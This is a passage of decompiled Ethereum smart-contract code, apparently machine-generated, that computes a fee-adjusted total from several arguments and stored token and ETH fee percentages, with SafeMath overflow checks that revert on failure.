        if (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18) < (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        if arg5 < 0:
            revert with 0, 'SafeMath: addition overflow'
        return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18))
    if arg2 * arg1 / arg1 != arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                    mem[197 len 31]
    if ethFeePercent * arg1 / 100 > arg1:
        revert with 0, 'SafeMath: subtraction overflow'
    if not arg1 - (ethFeePercent * arg1 / 100):
        if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        if (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        if arg5 < 0:
            revert with 0, 'SafeMath: addition overflow'
        return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18))
    if (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) / arg1 - (ethFeePercent * arg1 / 100) != arg3:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                    mem[197 len 31]
    if not (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3):
        if arg2 * arg1 / 10^18 < arg2 * arg1 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        if (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
            revert with 0, 'SafeMath: addition overflow'
        if arg5 < 0:
            revert with 0, 'SafeMath: addition overflow'
        return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + (arg2 * arg1 / 10^18))
    if (arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / (arg1 * arg3) - (ethFeePercent * arg1 / 100 * arg3) != arg4:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6c536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                    mem[197 len 31]
    if ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18) + (arg2 * arg1 / 10^18) < arg2 * arg1 / 10^18:
        revert with 0, 'SafeMath: addition overflow'
    if tokenFeePercent * arg2 * arg1 / 100 / 10^18 < 0:
        revert with 0, 'SafeMath: addition overflow'
    if arg5 < 0:
        revert with 0, 'SafeMath: addition overflow'
    return (arg5 + (tokenFeePercent * arg2 * arg1 / 100 / 10^18) + ((arg1 * arg3 * arg4) - (ethFeePercent * arg1 / 100 * arg3 * arg4) / 100 / 10^18) + (arg2 * arg1 / 10^18))
}



}
